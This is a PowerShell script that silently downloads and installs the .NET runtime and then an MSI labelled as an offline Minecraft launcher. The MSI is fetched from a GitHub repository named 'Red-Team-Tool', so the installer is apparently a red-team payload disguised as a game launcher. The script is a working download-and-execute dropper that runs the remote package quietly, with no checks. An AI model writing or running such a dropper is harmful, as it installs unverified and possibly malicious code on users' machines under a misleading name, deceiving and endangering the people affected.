# Define URLs for the resources to download
$dotnetInstallerUrl = "https://builds.dotnet.microsoft.com/dotnet/WindowsDesktop/6.0.36/windowsdesktop-runtime-6.0.36-win-x64.exe" # Direct .NET runtime installer URL
$githubFileUrl = "https://github.com/imgavinhi/Red-Team-Tool/raw/main/OfflineMinecraftLauncher-Setup-v1.1.0.msi" # Raw GitHub file URL

# Define download paths
$dotnetInstallerPath = "$env:USERPROFILE\Downloads\windowsdesktop-runtime-6.0.36-win-x64.exe"
$githubFilePath = "$env:USERPROFILE\Downloads\OfflineMinecraftLauncher-Setup-v1.1.0.msi"

# Step 1: Download .NET Runtime Installer
Write-Host "Downloading .NET Runtime Installer..."
Invoke-WebRequest -Uri $dotnetInstallerUrl -OutFile $dotnetInstallerPath

# Step 2: Download the file from GitHub
Write-Host "Downloading OfflineMinecraftLauncher-Setup from GitHub..."
Invoke-WebRequest -Uri $githubFileUrl -OutFile $githubFilePath

# Step 3: Install the .NET Runtime
Write-Host "Installing .NET Runtime..."
Start-Process -FilePath $dotnetInstallerPath -ArgumentList "/quiet", "/norestart" -Wait

# Step 4: Install the Offline Minecraft Launcher
Write-Host "Installing Offline Minecraft Launcher..."
Start-Process -FilePath $githubFilePath -ArgumentList "/quiet", "/norestart" -Wait

Write-Host "Installation complete!"
